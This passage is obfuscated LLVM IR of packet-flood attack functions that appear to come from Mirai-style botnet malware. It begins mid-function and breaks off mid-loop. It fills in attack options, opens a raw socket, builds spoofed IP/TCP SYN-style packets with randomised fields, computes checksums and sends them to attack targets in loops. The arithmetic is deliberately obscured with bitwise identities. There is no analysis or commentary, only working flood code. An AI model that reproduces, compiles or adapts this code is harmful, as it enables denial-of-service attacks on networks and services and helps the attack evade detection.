  %545 = xor i32 65535, -1
  %546 = xor i32 -1741200872, -1
  %547 = or i32 %544, %545
  %548 = or i32 -1741200872, %546
  %549 = xor i32 %547, -1
  %550 = and i32 %549, %548
  %551 = and i32 %543, 65535
  %552 = trunc i32 %550 to i16
  %553 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 3
  store i16 %552, i16* %554, align 4
  br label %555

; <label>:555:                                    ; preds = %542, %538
  %556 = load i16, i16* %16, align 2
  %557 = zext i16 %556 to i32
  %558 = icmp eq i32 %557, 65535
  br i1 %558, label %559, label %572

; <label>:559:                                    ; preds = %555
  %560 = call i32 @rand_next()
  %561 = xor i32 %560, -1
  %562 = xor i32 65535, -1
  %563 = xor i32 1609558949, -1
  %564 = or i32 %561, %562
  %565 = or i32 1609558949, %563
  %566 = xor i32 %564, -1
  %567 = and i32 %566, %565
  %568 = and i32 %560, 65535
  %569 = trunc i32 %567 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 0
  store i16 %569, i16* %571, align 4
  br label %572

; <label>:572:                                    ; preds = %559, %555
  %573 = load i16, i16* %17, align 2
  %574 = zext i16 %573 to i32
  %575 = icmp eq i32 %574, 65535
  br i1 %575, label %576, label %585

; <label>:576:                                    ; preds = %572
  %577 = call i32 @rand_next()
  %578 = xor i32 65535, -1
  %579 = xor i32 %577, %578
  %580 = and i32 %579, %577
  %581 = and i32 %577, 65535
  %582 = trunc i32 %580 to i16
  %583 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 1
  store i16 %582, i16* %584, align 2
  br label %585

; <label>:585:                                    ; preds = %576, %572
  %586 = load i32, i32* %18, align 4
  %587 = icmp eq i32 %586, 65535
  br i1 %587, label %588, label %592

; <label>:588:                                    ; preds = %585
  %589 = call i32 @rand_next()
  %590 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %591 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %590, i32 0, i32 2
  store i32 %589, i32* %591, align 4
  br label %592

; <label>:592:                                    ; preds = %588, %585
  %593 = load i32, i32* %19, align 4
  %594 = icmp eq i32 %593, 65535
  br i1 %594, label %595, label %599

; <label>:595:                                    ; preds = %592
  %596 = call i32 @rand_next()
  %597 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 3
  store i32 %596, i32* %598, align 4
  br label %599

; <label>:599:                                    ; preds = %595, %592
  %600 = load i8, i8* %20, align 1
  %601 = icmp ne i8 %600, 0
  br i1 %601, label %602, label %615

; <label>:602:                                    ; preds = %599
  %603 = call i32 @rand_next()
  %604 = xor i32 %603, -1
  %605 = xor i32 65535, -1
  %606 = xor i32 -448040624, -1
  %607 = or i32 %604, %605
  %608 = or i32 -448040624, %606
  %609 = xor i32 %607, -1
  %610 = and i32 %609, %608
  %611 = and i32 %603, 65535
  %612 = trunc i32 %610 to i16
  %613 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 7
  store i16 %612, i16* %614, align 2
  br label %615

; <label>:615:                                    ; preds = %602, %599
  %616 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %617 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %616, i32 0, i32 7
  store i16 0, i16* %617, align 2
  %618 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %619 = bitcast %struct.iphdr* %618 to i16*
  %620 = call zeroext i16 @checksum_generic(i16* %619, i32 20)
  %621 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %622 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %621, i32 0, i32 7
  store i16 %620, i16* %622, align 2
  %623 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %624 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %623, i32 0, i32 6
  store i16 0, i16* %624, align 4
  %625 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %626 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %627 = bitcast %struct.tcphdr* %626 to i8*
  %628 = call zeroext i16 @htons(i16 zeroext 40) #7
  %629 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %625, i8* %627, i16 zeroext %628, i32 40)
  %630 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %631 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %630, i32 0, i32 6
  store i16 %629, i16* %631, align 4
  %632 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %633 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %632, i32 0, i32 1
  %634 = load i16, i16* %633, align 2
  %635 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %636 = load i32, i32* %9, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i64 %637
  %639 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i32 0, i32 0
  %640 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %639, i32 0, i32 1
  store i16 %634, i16* %640, align 2
  %641 = load i32, i32* %10, align 4
  %642 = load i8*, i8** %30, align 8
  %643 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %644 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %645 = load i32, i32* %9, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %644, i64 %646
  %648 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %647, i32 0, i32 0
  %649 = bitcast %struct.sockaddr_in* %648 to %struct.sockaddr*
  store %struct.sockaddr* %649, %struct.sockaddr** %643, align 8
  %650 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %651 = load %struct.sockaddr*, %struct.sockaddr** %650, align 8
  %652 = call i64 @sendto(i32 %641, i8* %642, i64 60, i32 16384, %struct.sockaddr* %651, i32 16)
  br label %653

; <label>:653:                                    ; preds = %615
  %654 = load i32, i32* %9, align 4
  %655 = add i32 %654, -631739697
  %656 = add i32 %655, 1
  %657 = sub i32 %656, -631739697
  %658 = add nsw i32 %654, 1
  store i32 %657, i32* %9, align 4
  br label %483

; <label>:659:                                    ; preds = %483
  br label %482

; <label>:660:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_asyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %623

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %623

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %446, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %452

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 27, -1
  %137 = or i8 %134, %135
  %138 = or i8 27, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = and i8 %140, 64
  %143 = xor i8 %140, 64
  %144 = or i8 %142, %143
  %145 = or i8 %140, 64
  store i8 %144, i8* %132, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = xor i8 %148, -1
  %150 = xor i8 -16, -1
  %151 = xor i8 -104, -1
  %152 = or i8 %149, %150
  %153 = or i8 -104, %151
  %154 = xor i8 %152, -1
  %155 = and i8 %154, %153
  %156 = and i8 %148, -16
  %157 = and i8 %155, 5
  %158 = xor i8 %155, 5
  %159 = or i8 %157, %158
  %160 = or i8 %155, 5
  store i8 %159, i8* %147, align 4
  %161 = load i8, i8* %12, align 1
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 1
  store i8 %161, i8* %163, align 1
  %164 = call zeroext i16 @htons(i16 zeroext 60) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  %167 = load i16, i16* %13, align 2
  %168 = call zeroext i16 @htons(i16 zeroext %167) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 3
  store i16 %168, i16* %170, align 4
  %171 = load i8, i8* %14, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 5
  store i8 %171, i8* %173, align 4
  %174 = load i8, i8* %15, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %180

; <label>:176:                                    ; preds = %113
  %177 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 4
  store i16 %177, i16* %179, align 2
  br label %180

; <label>:180:                                    ; preds = %176, %113
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 6, i8* %182, align 1
  %183 = load i32, i32* %26, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 8
  store i32 %183, i32* %185, align 4
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 1
  %191 = load i32, i32* %190, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  store i32 %191, i32* %193, align 4
  %194 = load i16, i16* %16, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 4
  %198 = load i16, i16* %17, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load i32, i32* %18, align 4
  %203 = trunc i32 %202 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = zext i16 %204 to i32
  %206 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 2
  store i32 %205, i32* %207, align 4
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = xor i16 %210, -1
  %212 = xor i16 -241, -1
  %213 = xor i16 -11655, -1
  %214 = or i16 %211, %212
  %215 = or i16 -11655, %213
  %216 = xor i16 %214, -1
  %217 = and i16 %216, %215
  %218 = and i16 %210, -241
  %219 = and i16 %217, 160
  %220 = xor i16 %217, 160
  %221 = or i16 %219, %220
  %222 = or i16 %217, 160
  store i16 %221, i16* %209, align 4
  %223 = load i8, i8* %20, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 %224, -1
  %229 = xor i16 1, -1
  %230 = xor i16 -140, -1
  %231 = or i16 %228, %229
  %232 = or i16 -140, %230
  %233 = xor i16 %231, -1
  %234 = and i16 %233, %232
  %235 = and i16 %224, 1
  %236 = shl i16 %234, 13
  %237 = xor i16 %227, -1
  %238 = xor i16 -8193, -1
  %239 = xor i16 -20485, -1
  %240 = or i16 %237, %238
  %241 = or i16 -20485, %239
  %242 = xor i16 %240, -1
  %243 = and i16 %242, %241
  %244 = and i16 %227, -8193
  %245 = xor i16 %243, -1
  %246 = xor i16 %236, -1
  %247 = xor i16 26728, -1
  %248 = and i16 %245, 26728
  %249 = and i16 %243, %247
  %250 = and i16 %246, 26728
  %251 = and i16 %236, %247
  %252 = or i16 %248, %249
  %253 = or i16 %250, %251
  %254 = xor i16 %252, %253
  %255 = or i16 %245, %246
  %256 = xor i16 %255, -1
  %257 = or i16 26728, %247
  %258 = and i16 %256, %257
  %259 = or i16 %254, %258
  %260 = or i16 %243, %236
  store i16 %259, i16* %226, align 4
  %261 = load i8, i8* %21, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 1, -1
  %267 = xor i16 %262, %266
  %268 = and i16 %267, %262
  %269 = and i16 %262, 1
  %270 = shl i16 %268, 12
  %271 = xor i16 %265, -1
  %272 = xor i16 -4097, -1
  %273 = xor i16 -2897, -1
  %274 = or i16 %271, %272
  %275 = or i16 -2897, %273
  %276 = xor i16 %274, -1
  %277 = and i16 %276, %275
  %278 = and i16 %265, -4097
  %279 = xor i16 %277, -1
  %280 = xor i16 %270, -1
  %281 = xor i16 31279, -1
  %282 = and i16 %279, 31279
  %283 = and i16 %277, %281
  %284 = and i16 %280, 31279
  %285 = and i16 %270, %281
  %286 = or i16 %282, %283
  %287 = or i16 %284, %285
  %288 = xor i16 %286, %287
  %289 = or i16 %279, %280
  %290 = xor i16 %289, -1
  %291 = or i16 31279, %281
  %292 = and i16 %290, %291
  %293 = or i16 %288, %292
  %294 = or i16 %277, %270
  store i16 %293, i16* %264, align 4
  %295 = load i8, i8* %22, align 1
  %296 = sext i8 %295 to i16
  %297 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = xor i16 %296, -1
  %301 = xor i16 1, -1
  %302 = xor i16 16999, -1
  %303 = or i16 %300, %301
  %304 = or i16 16999, %302
  %305 = xor i16 %303, -1
  %306 = and i16 %305, %304
  %307 = and i16 %296, 1
  %308 = shl i16 %306, 11
  %309 = xor i16 %299, -1
  %310 = xor i16 -2049, -1
  %311 = xor i16 -26329, -1
  %312 = or i16 %309, %310
  %313 = or i16 -26329, %311
  %314 = xor i16 %312, -1
  %315 = and i16 %314, %313
  %316 = and i16 %299, -2049
  %317 = and i16 %315, %308
  %318 = xor i16 %315, %308
  %319 = or i16 %317, %318
  %320 = or i16 %315, %308
  store i16 %319, i16* %298, align 4
  %321 = load i8, i8* %23, align 1
  %322 = sext i8 %321 to i16
  %323 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 4
  %325 = load i16, i16* %324, align 4
  %326 = xor i16 %322, -1
  %327 = xor i16 1, -1
  %328 = xor i16 -19171, -1
  %329 = or i16 %326, %327
  %330 = or i16 -19171, %328
  %331 = xor i16 %329, -1
  %332 = and i16 %331, %330
  %333 = and i16 %322, 1
  %334 = shl i16 %332, 10
  %335 = xor i16 %325, -1
  %336 = xor i16 -1025, -1
  %337 = xor i16 -12439, -1
  %338 = or i16 %335, %336
  %339 = or i16 -12439, %337
  %340 = xor i16 %338, -1
  %341 = and i16 %340, %339
  %342 = and i16 %325, -1025
  %343 = xor i16 %341, -1
  %344 = xor i16 %334, -1
  %345 = xor i16 -25382, -1
  %346 = and i16 %343, -25382
  %347 = and i16 %341, %345
  %348 = and i16 %344, -25382
  %349 = and i16 %334, %345
  %350 = or i16 %346, %347
  %351 = or i16 %348, %349
  %352 = xor i16 %350, %351
  %353 = or i16 %343, %344
  %354 = xor i16 %353, -1
  %355 = or i16 -25382, %345
  %356 = and i16 %354, %355
  %357 = or i16 %352, %356
  %358 = or i16 %341, %334
  store i16 %357, i16* %324, align 4
  %359 = load i8, i8* %24, align 1
  %360 = sext i8 %359 to i16
  %361 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 4
  %363 = load i16, i16* %362, align 4
  %364 = xor i16 1, -1
  %365 = xor i16 %360, %364
  %366 = and i16 %365, %360
  %367 = and i16 %360, 1
  %368 = shl i16 %366, 9
  %369 = xor i16 %363, -1
  %370 = xor i16 -513, -1
  %371 = xor i16 -13750, -1
  %372 = or i16 %369, %370
  %373 = or i16 -13750, %371
  %374 = xor i16 %372, -1
  %375 = and i16 %374, %373
  %376 = and i16 %363, -513
  %377 = and i16 %375, %368
  %378 = xor i16 %375, %368
  %379 = or i16 %377, %378
  %380 = or i16 %375, %368
  store i16 %379, i16* %362, align 4
  %381 = load i8, i8* %25, align 1
  %382 = sext i8 %381 to i16
  %383 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 4
  %385 = load i16, i16* %384, align 4
  %386 = xor i16 1, -1
  %387 = xor i16 %382, %386
  %388 = and i16 %387, %382
  %389 = and i16 %382, 1
  %390 = shl i16 %388, 8
  %391 = xor i16 %385, -1
  %392 = xor i16 -257, -1
  %393 = xor i16 23122, -1
  %394 = or i16 %391, %392
  %395 = or i16 23122, %393
  %396 = xor i16 %394, -1
  %397 = and i16 %396, %395
  %398 = and i16 %385, -257
  %399 = and i16 %397, %390
  %400 = xor i16 %397, %390
  %401 = or i16 %399, %400
  %402 = or i16 %397, %390
  store i16 %401, i16* %384, align 4
  %403 = load i8*, i8** %29, align 8
  %404 = getelementptr inbounds i8, i8* %403, i32 1
  store i8* %404, i8** %29, align 8
  store i8 2, i8* %403, align 1
  %405 = load i8*, i8** %29, align 8
  %406 = getelementptr inbounds i8, i8* %405, i32 1
  store i8* %406, i8** %29, align 8
  store i8 4, i8* %405, align 1
  %407 = call i32 @rand_next()
  %408 = xor i32 15, -1
  %409 = xor i32 %407, %408
  %410 = and i32 %409, %407
  %411 = and i32 %407, 15
  %412 = sub i32 0, %410
  %413 = sub i32 1400, %412
  %414 = add i32 1400, %410
  %415 = trunc i32 %413 to i16
  %416 = call zeroext i16 @htons(i16 zeroext %415) #7
  %417 = load i8*, i8** %29, align 8
  %418 = bitcast i8* %417 to i16*
  store i16 %416, i16* %418, align 2
  %419 = load i8*, i8** %29, align 8
  %420 = getelementptr inbounds i8, i8* %419, i64 2
  store i8* %420, i8** %29, align 8
  %421 = load i8*, i8** %29, align 8
  %422 = getelementptr inbounds i8, i8* %421, i32 1
  store i8* %422, i8** %29, align 8
  store i8 4, i8* %421, align 1
  %423 = load i8*, i8** %29, align 8
  %424 = getelementptr inbounds i8, i8* %423, i32 1
  store i8* %424, i8** %29, align 8
  store i8 2, i8* %423, align 1
  %425 = load i8*, i8** %29, align 8
  %426 = getelementptr inbounds i8, i8* %425, i32 1
  store i8* %426, i8** %29, align 8
  store i8 8, i8* %425, align 1
  %427 = load i8*, i8** %29, align 8
  %428 = getelementptr inbounds i8, i8* %427, i32 1
  store i8* %428, i8** %29, align 8
  store i8 10, i8* %427, align 1
  %429 = call i32 @rand_next()
  %430 = load i8*, i8** %29, align 8
  %431 = bitcast i8* %430 to i32*
  store i32 %429, i32* %431, align 4
  %432 = load i8*, i8** %29, align 8
  %433 = getelementptr inbounds i8, i8* %432, i64 4
  store i8* %433, i8** %29, align 8
  %434 = load i8*, i8** %29, align 8
  %435 = bitcast i8* %434 to i32*
  store i32 0, i32* %435, align 4
  %436 = load i8*, i8** %29, align 8
  %437 = getelementptr inbounds i8, i8* %436, i64 4
  store i8* %437, i8** %29, align 8
  %438 = load i8*, i8** %29, align 8
  %439 = getelementptr inbounds i8, i8* %438, i32 1
  store i8* %439, i8** %29, align 8
  store i8 1, i8* %438, align 1
  %440 = load i8*, i8** %29, align 8
  %441 = getelementptr inbounds i8, i8* %440, i32 1
  store i8* %441, i8** %29, align 8
  store i8 3, i8* %440, align 1
  %442 = load i8*, i8** %29, align 8
  %443 = getelementptr inbounds i8, i8* %442, i32 1
  store i8* %443, i8** %29, align 8
  store i8 3, i8* %442, align 1
  %444 = load i8*, i8** %29, align 8
  %445 = getelementptr inbounds i8, i8* %444, i32 1
  store i8* %445, i8** %29, align 8
  store i8 6, i8* %444, align 1
  br label %446

; <label>:446:                                    ; preds = %180
  %447 = load i32, i32* %9, align 4
  %448 = sub i32 %447, 794010614
  %449 = add i32 %448, 1
  %450 = add i32 %449, 794010614
  %451 = add nsw i32 %447, 1
  store i32 %450, i32* %9, align 4
  br label %108

; <label>:452:                                    ; preds = %108
  br label %453

; <label>:453:                                    ; preds = %622, %452
  store i32 0, i32* %9, align 4
  br label %454

; <label>:454:                                    ; preds = %616, %453
  %455 = load i32, i32* %9, align 4
  %456 = load i8, i8* %5, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp slt i32 %455, %457
  br i1 %458, label %459, label %622

; <label>:459:                                    ; preds = %454
  %460 = load i8**, i8*** %11, align 8
  %461 = load i32, i32* %9, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds i8*, i8** %460, i64 %462
  %464 = load i8*, i8** %463, align 8
  store i8* %464, i8** %30, align 8
